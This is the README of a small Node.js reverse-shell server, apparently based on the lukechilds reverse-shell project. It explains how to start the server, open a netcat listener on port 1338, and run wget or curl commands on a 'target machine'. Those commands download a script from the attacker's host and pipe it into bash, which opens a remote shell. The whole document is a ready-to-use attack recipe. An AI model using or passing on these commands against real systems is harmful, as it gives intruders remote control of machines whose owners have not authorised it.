# shells
shells, based on [reverse-shell](https://github.com/lukechilds/reverse-shell).

# run
run this
```
node index.js
```
you can change the port in `config/default.json`.

# give me a shell
Listen with netcat:
```
nc -lvp 1338
```

run this on the target machine:
```
wget -qO- http://mi-ip-host:port/127.0.0.1:1338 | bash

curl http://mi-ip-host:port/127.0.0.1:1338 | bash
```
